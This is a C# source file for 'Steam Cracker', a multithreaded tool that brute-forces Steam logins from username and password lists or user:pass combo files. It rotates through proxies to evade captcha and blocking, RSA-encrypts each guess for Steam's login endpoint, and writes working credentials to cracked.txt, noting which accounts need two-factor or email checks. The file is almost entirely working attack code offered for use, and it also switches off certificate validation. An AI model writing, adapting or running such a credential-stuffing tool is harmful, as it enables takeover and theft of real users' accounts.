using System;
using System.Collections;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Checker
{

internal class Program
  {
    public static int Correct = 0;
    public static int Wrong = 0;
    public static int Captcha = 0;
    public static int Proxys = 0;
    public static int Threadss;
    public static bool combo = false;

    private static string ip = "";
    private static void Main(string[] args)
    {
        Console.Title = "Steam Cracker";
        //checkIP();
        //checkLicense();
        Console.WriteLine("-----------------");
        Console.WriteLine("--Steam-Cracker--");
        Console.WriteLine("---HTTPS/SOCKS5--");
        Console.WriteLine("----BY-qoble-----");
            A:
        Console.WriteLine("");
        Console.WriteLine("Choose bruteforce type:");
        Console.WriteLine("'A' For User/Password list attack.");
        Console.WriteLine("'Z' For User:Pass Combo attack.");
        ArrayList Usernames = null;
        ArrayList Passwords = null;
        ArrayList Combinations = null;
        ArrayList Proxies = GetProxies();
        string option = Console.ReadLine();
        switch (option)
        {
            case "A":
                Usernames = GetUsernames();
                Passwords = GetPasswords();
                    Console.WriteLine("Usernames: " + Usernames.Count);
                    Console.WriteLine("Passwords: " + Passwords.Count);
                    combo = false;
                    break;
            case "Z":
                Combinations = GetCombinations();
                    Console.WriteLine("Combinations: " + Combinations.Count);
                    combo = true;
                    break;
            default:
                    Console.WriteLine("No attack type selected!");
                goto A;
        }

        Console.WriteLine("Proxies: " + Proxies.Count);

        Console.WriteLine("");

        Console.WriteLine("How many threads?");

        var threads = int.Parse(Console.ReadLine());

        Console.WriteLine("");

        Threadss = threads;

        var DecThreads = Convert.ToDecimal(Threadss);

        var DecUsernames = Convert.ToDecimal(Usernames.Count);
        var DecValueUsernames = DecUsernames / DecThreads;

        var DecProxies = Convert.ToDecimal(Proxies.Count);
        var DecValueProxies = DecProxies / DecThreads;


        Console.WriteLine("");
        Console.WriteLine("Starting!");
        Console.WriteLine("");

        var ItemAt = 0;
        var ItemAt2 = 0;
        var Counter = 0;

        for (var I = 0; I < threads; I++)
        {
            var TempUsernames = new ArrayList();
            var TempProxies = new ArrayList();
            try
            {
                for (var Items = ItemAt; Items < (ItemAt + Math.Floor(DecValueUsernames)); Items++)
                {
                    TempUsernames.Add(Usernames[Items].ToString());
                }
                for (var Items2 = ItemAt2; Items2 < (ItemAt2 + Math.Floor(DecValueProxies)); Items2++)
                {
                    TempProxies.Add(Proxies[Items2].ToString());
                }
                ItemAt = ItemAt + Convert.ToInt32(Math.Floor(DecValueUsernames));
                ItemAt2 = ItemAt2 + Convert.ToInt32(Math.Floor(DecValueProxies));
            }
            catch
            {
                // ignored
            }

            var counter = Counter;
            ThreadStart Crack = delegate
            {
                Checker(TempUsernames, Passwords, TempProxies, counter);
            };
            new Thread(Crack).Start();

            Counter++;
        }
        Console.ReadLine();
    }

    private static void Save(string Data,int type)
    {
        const string txtName = "cracked.txt";

        var ApplicationPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + @"\" + txtName;

        var TempData = "";
        StreamReader Sr = null;

        try{
            Sr = new StreamReader(ApplicationPath);
            TempData = Sr.ReadToEnd();
            Sr.Close();
        }catch{
            Sr.Close();
        }

        var Sw = new StreamWriter(ApplicationPath);

        if (TempData == ""){
            Sw.Write(Data);
        }else{
            Sw.Write(TempData + Environment.NewLine + Data);
        }

        Sw.Close();
    }

    private static ArrayList GetProxies(){
        var AL = new ArrayList();
        var ApplicationPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + @"\proxies.txt";
        var SR = new StreamReader(ApplicationPath);

        while (SR.Peek() > -1){
            AL.Add(SR.ReadLine());
        }

        return AL;
    }

    private static ArrayList GetUsernames()
    {
        var AL = new ArrayList();
        try
        {
            var ApplicationPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + @"\usernames.txt";
            var SR = new StreamReader(ApplicationPath);

            while (SR.Peek() > -1)
            {
                AL.Add(SR.ReadLine());
            }
        }
        catch (Exception)
        {
            return AL;
        }

        return AL;
    }

    private static ArrayList GetPasswords()
    {
        var AL = new ArrayList();
        try
        {
            var ApplicationPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + @"\passwords.txt";
            var SR = new StreamReader(ApplicationPath);

            while (SR.Peek() > -1)
            {
                AL.Add(SR.ReadLine());
            }
        }
        catch (Exception)
        {
            return AL;
        }

        return AL;
    }

    private static ArrayList GetCombinations()
    {
        var AL = new ArrayList();
        try
        {
            var ApplicationPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + @"\combinations.txt";
            var SR = new StreamReader(ApplicationPath);

            while (SR.Peek() > -1)
            {
                AL.Add(SR.ReadLine());
            }
        }
        catch (Exception)
        {
            return AL;
        }

        return AL;
    }

    public static string RemoveSpecialCharacters(string str)
    {
        StringBuilder sb = new StringBuilder();
        foreach (char c in str)
        {
            if ((c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || c == '_')
            {
                sb.Append(c);
            }
        }
        return sb.ToString();
    }

    private static void Checker(ArrayList Usernames, ArrayList Passwords, ArrayList proxies, int threadId)
    {
        int Counter = 0;
        int XValue = 0;
        int YValue = 0;
        Continue:
            Console.Title = string.Format("qoble Steam - Cracked: {0}", Correct);
        for (var X = XValue; X < Usernames.Count; X++)
        {
            for (var Y = YValue; Y < Passwords.Count; Y++)
            {
            Retry:
                if (Counter == proxies.Count)
                {
                    Counter = 0;
                }
                
                try
                {
                    string Username;
                    string Password;
                    try
                    {
                        Username = RemoveSpecialCharacters(Usernames[X].ToString());
                        
                    }
                    catch (Exception)
                    {
                        goto Continue;
                    }

                    try
                    {
                        Password = Passwords[Y].ToString();
                    }
                    catch (Exception)
                    {
                        goto end;
                    }

                    ServicePointManager.ServerCertificateValidationCallback +=
                        (sender, cert, chain, sslPolicyErrors) => true;
                    var Proxy = proxies[Counter].ToString();
                    var Host = Proxy.Remove(Proxy.IndexOf(":"));
                    var Token = int.Parse(Proxy.Remove(0, Proxy.IndexOf(":") + ":".Length));



                    //Get COOKIES
                    var defaultLogin = (HttpWebRequest)WebRequest.Create("https://store.steampowered.com//login/?redir=0");
                    defaultLogin.Timeout = 10000;
                    defaultLogin.Proxy = new WebProxy(Host, Token);
                    defaultLogin.UserAgent =  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0";
                    defaultLogin.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                    defaultLogin.ContentType = "text/html; charset=UTF-8";
                    defaultLogin.AllowAutoRedirect = false;
                    defaultLogin.KeepAlive = false;
                    defaultLogin.Method = "GET";

                    var myCookie = new CookieContainer();
                    defaultLogin.CookieContainer = myCookie;

                    var defaultResponseresponse = (HttpWebResponse)defaultLogin.GetResponse();
                    foreach (Cookie responseCookie in defaultResponseresponse.Cookies)
                    {
                        myCookie.Add(responseCookie);
                    }
                    var defaultStream = new StreamReader(defaultResponseresponse.GetResponseStream());
                    defaultStream.Close();
                    //

                    //GET PUB RSA KEY
                    var d = Encoding.ASCII.GetBytes(string.Format("username={0}", Username));
                    var request = (HttpWebRequest)WebRequest.Create("https://store.steampowered.com/login/getrsakey/");
                    request.Timeout = 15000;
                    request.Proxy = new WebProxy(Host, Token);
                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0";
                    request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                    request.ContentLength = d.Length;
                    request.AllowAutoRedirect = true;
                    request.KeepAlive = true;
                    request.Method = "POST";
                    request.CookieContainer = myCookie;

                    using (var stream = request.GetRequestStream())
                    {
                        stream.Write(d, 0, d.Length);
                    }

                    var response = (HttpWebResponse)request.GetResponse();
                    foreach (Cookie responseCookie in response.Cookies)
                    {
                        myCookie.Add(responseCookie);
                    }
                    var thirdStream = new StreamReader(response.GetResponseStream());
                    var requestResponse = thirdStream.ReadToEnd();
                    thirdStream.Close();

                    bool success = false;

                    string pubkey;
                    string pubkey_exp;
                    string timestamp;

                    if (!requestResponse.Contains("Site Blocked"))
                    {
                        if (requestResponse.Contains("success\":true"))
                        {
                            try
                            {
                                pubkey = GetSubstring(requestResponse, "publickey_mod\":\"", "\",");
                                pubkey_exp = GetSubstring(requestResponse, "publickey_exp\":\"", "\",");
                                timestamp = GetSubstring(requestResponse, "timestamp\":\"", "\",");
                            }
                            catch (Exception)
                            {
                                Counter++;
                                goto Retry;
                            }

                        }
                        else
                        {
                            Counter++;
                            goto Retry;
                        }
                    }
                    else
                    {
                        Counter++;
                        goto Retry;
                    }
                    //

                    //---- BEGIN LOGIN PROCESS
                    var login_d = Encoding.ASCII.GetBytes(string.Format("password={0}&username={1}&twofactorcode=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp={2}&remember_login=false", encrypt_steamPASSWORD(Password, pubkey_exp, pubkey), Username, timestamp));
                    var requestLogin = (HttpWebRequest)WebRequest.Create("https://store.steampowered.com/login/dologin/");
                    requestLogin.Timeout = 15000;
                    requestLogin.Proxy = new WebProxy(Host, Token);
                    requestLogin.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0";
                    requestLogin.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                    requestLogin.Headers.Add("X-Requested-With", "XMLHttpRequest");
                    requestLogin.AllowAutoRedirect = false;
                    requestLogin.KeepAlive = true;
                    requestLogin.Referer = "https://store.steampowered.com/login/";
                    requestLogin.ContentLength = login_d.Length;
                    requestLogin.Method = "POST";
                    requestLogin.CookieContainer = myCookie;

                    using (var stream = requestLogin.GetRequestStream())
                    {
                        stream.Write(login_d, 0, login_d.Length);
                    }

                    var responseLogin = (HttpWebResponse)requestLogin.GetResponse();
                    var streamLogin = new StreamReader(responseLogin.GetResponseStream());
                    var loginResponse = streamLogin.ReadToEnd();
                    streamLogin.Close();

                    if (loginResponse.Contains("\"success\":true"))
                    {
                        if (loginResponse.Contains("\"login_complete\":true"))
                        {
                            Console.WriteLine("[Thread {0}]Valid {1}:{2} <--- NO AUTH NEEDED!", threadId, Username, Password);
                            Save(string.Format("{0}:{1}", Username, Password), 2);
                            XValue = X;
                            XValue++;
                            Correct++;
                            goto Continue;
                        }
                    }
                    else
                    {
                        string[] keys = new string[] { "\"requires_twofactor\":true", "\"emailauth_needed\":true", "\"captcha_needed\":true", "message" };
                        string sKeyResult = keys.FirstOrDefault<string>(s => loginResponse.Contains(s));

                        switch (sKeyResult)
                        {
                            case "\"captcha_needed\":true":
                                Counter++;
                                goto Retry;
                            case "message":
                                    var message = GetSubstring(loginResponse, "\"message\":\"", "\"");
                                    if (message == "Incorrect login.")
                                    {
                                        Console.WriteLine("[Thread {0}]Invalid {1}:{2}", threadId, Username, Password);
                                        goto end;
                                    }
                                break;
                            case "\"requires_twofactor\":true":
                                Console.WriteLine("[Thread {0}]Correct {1}:{2} <--- two factor auth needed", threadId, Username, Password);
                                Save(string.Format("{0}:{1} //two factor auth needed", Username, Password), 2);
                                XValue = X;
                                XValue++;
                                Correct++;
                                goto Continue;
                            case "\"emailauth_needed\":true":
                                Console.WriteLine("[Thread {0}]Correct {1}:{2} <--- email auth needed", threadId, Username, Password);
                                Save(string.Format("{0}:{1} //email auth needed", Username, Password), 2);
                                XValue = X;
                                XValue++;
                                Correct++;
                                goto Continue;
                            default:
                                Counter++;
                                goto Retry;
                        }
                    }
                    end:
                    ;
                }
                catch (WebException)
                {
                    //Console.WriteLine("[Thread {0}]Proxy Dead - Rotating",threadId);
                    Counter++;
                    goto Retry;
                }
            }
        }
        Console.WriteLine("[Thread {0}]Finished Cracking",threadId);
    }

    private static void ComboChecker(ArrayList Combinations, ArrayList proxies, int threadId)
    {
            int Counter = 0;
            int XValue = 0;
            int YValue = 0;
            Continue:
            Console.Title = string.Format("qoble Steam - Cracked: {0}", Correct);
            for (var X = XValue; X < Combinations.Count; X++)
            {
                    Retry:
                    if (Counter == proxies.Count)
                    {
                        Counter = 0;
                    }

                    try
                    {
                        string Username;
                        string Password;
                        try
                        {
                            Username = Combinations[X].ToString().Remove(Combinations.IndexOf(":"));
                        }
                        catch (Exception)
                        {
                            goto Continue;
                        }

                        try
                        {
                            Password = Combinations[X].ToString().Remove(0, Combinations[X].ToString().IndexOf(":") + ":".Length);
                        }
                        catch (Exception)
                        {
                            goto end;
                        }

                        ServicePointManager.ServerCertificateValidationCallback +=
                            (sender, cert, chain, sslPolicyErrors) => true;
                        var Proxy = proxies[Counter].ToString();
                        var Host = Proxy.Remove(Proxy.IndexOf(":"));
                        var Token = int.Parse(Proxy.Remove(0, Proxy.IndexOf(":") + ":".Length));



                        //Get COOKIES
                        var defaultLogin = (HttpWebRequest)WebRequest.Create("https://store.steampowered.com//login/?redir=0");
                        defaultLogin.Timeout = 10000;
                        defaultLogin.Proxy = new WebProxy(Host, Token);
                        defaultLogin.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0";
                        defaultLogin.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                        defaultLogin.ContentType = "text/html; charset=UTF-8";
                        defaultLogin.AllowAutoRedirect = false;
                        defaultLogin.KeepAlive = false;
                        defaultLogin.Method = "GET";

                        var myCookie = new CookieContainer();
                        defaultLogin.CookieContainer = myCookie;

                        var defaultResponseresponse = (HttpWebResponse)defaultLogin.GetResponse();
                        foreach (Cookie responseCookie in defaultResponseresponse.Cookies)
                        {
                            myCookie.Add(responseCookie);
                        }
                        var defaultStream = new StreamReader(defaultResponseresponse.GetResponseStream());
                        defaultStream.Close();
                        //

                        //GET PUB RSA KEY
                        var d = Encoding.ASCII.GetBytes(string.Format("username={0}", Username));
                        var request = (HttpWebRequest)WebRequest.Create("https://store.steampowered.com/login/getrsakey/");
                        request.Timeout = 15000;
                        request.Proxy = new WebProxy(Host, Token);
                        request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0";
                        request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                        request.ContentLength = d.Length;
                        request.AllowAutoRedirect = true;
                        request.KeepAlive = true;
                        request.Method = "POST";
                        request.CookieContainer = myCookie;

                        using (var stream = request.GetRequestStream())
                        {
                            stream.Write(d, 0, d.Length);
                        }

                        var response = (HttpWebResponse)request.GetResponse();
                        foreach (Cookie responseCookie in response.Cookies)
                        {
                            myCookie.Add(responseCookie);
                        }
                        var thirdStream = new StreamReader(response.GetResponseStream());
                        var requestResponse = thirdStream.ReadToEnd();
                        thirdStream.Close();
                        bool success = false;

                        string pubkey;
                        string pubkey_exp;
                        string timestamp;

                        if (!requestResponse.Contains("Site Blocked"))
                        {
                            if (requestResponse.Contains("success\":true"))
                            {
                                try
                                {
                                    pubkey = GetSubstring(requestResponse, "publickey_mod\":\"", "\",");
                                    pubkey_exp = GetSubstring(requestResponse, "publickey_exp\":\"", "\",");
                                    timestamp = GetSubstring(requestResponse, "timestamp\":\"", "\",");
                                }
                                catch (Exception)
                                {
                                    Counter++;
                                    goto Retry;
                                }

                            }
                            else
                            {
                                Counter++;
                                goto Retry;
                            }
                        }
                        else
                        {
                            Counter++;
                            goto Retry;
                        }
                        //

                        //---- BEGIN LOGIN PROCESS
                        var login_d = Encoding.ASCII.GetBytes(string.Format("password={0}&username={1}&twofactorcode=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp={2}&remember_login=false", encrypt_steamPASSWORD(Password, pubkey_exp, pubkey), Username, timestamp));
                        var requestLogin = (HttpWebRequest)WebRequest.Create("https://store.steampowered.com/login/dologin/");
                        requestLogin.Timeout = 15000;
                        requestLogin.Proxy = new WebProxy(Host, Token);
                        requestLogin.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0";
                        requestLogin.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                        requestLogin.Headers.Add("X-Requested-With", "XMLHttpRequest");
                        requestLogin.AllowAutoRedirect = false;
                        requestLogin.KeepAlive = true;
                        requestLogin.Referer = "https://store.steampowered.com/login/";
                        requestLogin.ContentLength = login_d.Length;
                        requestLogin.Method = "POST";
                        requestLogin.CookieContainer = myCookie;

                        using (var stream = requestLogin.GetRequestStream())
                        {
                            stream.Write(login_d, 0, login_d.Length);
                        }

                        var responseLogin = (HttpWebResponse)requestLogin.GetResponse();
                        var streamLogin = new StreamReader(responseLogin.GetResponseStream());
                        var loginResponse = streamLogin.ReadToEnd();
                        streamLogin.Close();

                        if (loginResponse.Contains("\"success\":true"))
                        {
                            if (loginResponse.Contains("\"login_complete\":true"))
                            {
                                Console.WriteLine("[Thread {0}]Valid {1}:{2} <--- NO AUTH NEEDED!", threadId, Username, Password);
                                Save(string.Format("{0}:{1}", Username, Password), 2);
                                XValue = X;
                                XValue++;
                                Correct++;
                                goto Continue;
                            }
                        }
                        else
                        {
                            string[] keys = new string[] { "\"requires_twofactor\":true", "\"emailauth_needed\":true", "\"captcha_needed\":true", "message" };
                            string sKeyResult = keys.FirstOrDefault<string>(s => loginResponse.Contains(s));

                            switch (sKeyResult)
                            {
                                case "\"captcha_needed\":true":
                                    Counter++;
                                    goto Retry;
                                case "message":
                                    var message = GetSubstring(loginResponse, "\"message\":\"", "\"");
                                    if (message == "Incorrect login.")
                                    {
                                        Console.WriteLine("[Thread {0}]Invalid {1}:{2}", threadId, Username, Password);
                                        goto end;
                                    }
                                    break;
                                case "\"requires_twofactor\":true":
                                    Console.WriteLine("[Thread {0}]Correct {1}:{2} <--- two factor auth needed", threadId, Username, Password);
                                    Save(string.Format("{0}:{1} //two factor auth needed", Username, Password), 2);
                                    XValue = X;
                                    XValue++;
                                    Correct++;
                                    goto Continue;
                                case "\"emailauth_needed\":true":
                                    Console.WriteLine("[Thread {0}]Correct {1}:{2} <--- email auth needed", threadId, Username, Password);
                                    Save(string.Format("{0}:{1} //email auth needed", Username, Password), 2);
                                    XValue = X;
                                    XValue++;
                                    Correct++;
                                    goto Continue;
                                default:
                                    Counter++;
                                    goto Retry;
                            }
                        }
                        end:
                        ;
                    }
                    catch (WebException)
                    {
                        //Console.WriteLine("[Thread {0}]Proxy Dead - Rotating",threadId);
                        Counter++;
                        goto Retry;
                    }
            }
            Console.WriteLine("[Thread {0}]Finished Cracking", threadId);
        }
       
    private static byte[] HexToByte(string hex)
    {
        if (hex.Length % 2 == 1)
            throw new Exception("The binary key cannot have an odd number of digits");

        var arr = new byte[hex.Length >> 1];
        var l = hex.Length;

        for (var i = 0; i < (l >> 1); ++i)
        {
            arr[i] = (byte)((GetHexVal(hex[i << 1]) << 4) + (GetHexVal(hex[(i << 1) + 1])));
        }

        return arr;
    }

    private static int GetHexVal(char hex)
    {
        var val = (int)hex;
        return val - (val < 58 ? 48 : 55);
    }

    public static string encrypt_steamPASSWORD(string Password, string private_key, string pubkey)
    {
        using (var rsa = new RSACryptoServiceProvider())
        {

            try
            {

                var rsaParameters = new RSAParameters();

                rsaParameters.Exponent = HexToByte(private_key);
                rsaParameters.Modulus = HexToByte(pubkey);

                rsa.ImportParameters(rsaParameters);

                var bytePassword = Encoding.ASCII.GetBytes(Password);
                var encodedPassword = rsa.Encrypt(bytePassword, false);
                return Uri.EscapeDataString(Convert.ToBase64String(encodedPassword));
            }
            finally
            {
                rsa.PersistKeyInCsp = false;
            }

        }
    }
    public static string GetSubstring(string THIES, string from = null, string until = null, StringComparison comparison = StringComparison.InvariantCulture)
    {
        var fromLength = (from ?? string.Empty).Length;
        var startIndex = !string.IsNullOrEmpty(from)
            ? THIES.IndexOf(from, comparison) + fromLength
            : 0;

        if (startIndex < fromLength) { return "qobleERROR"; }

        var endIndex = !string.IsNullOrEmpty(until)
        ? THIES.IndexOf(until, startIndex, comparison)
        : THIES.Length;

        if (endIndex < 0) { return "qobleERROR"; }

        var subString = THIES.Substring(startIndex, endIndex - startIndex);
        return subString;
    }
  }
}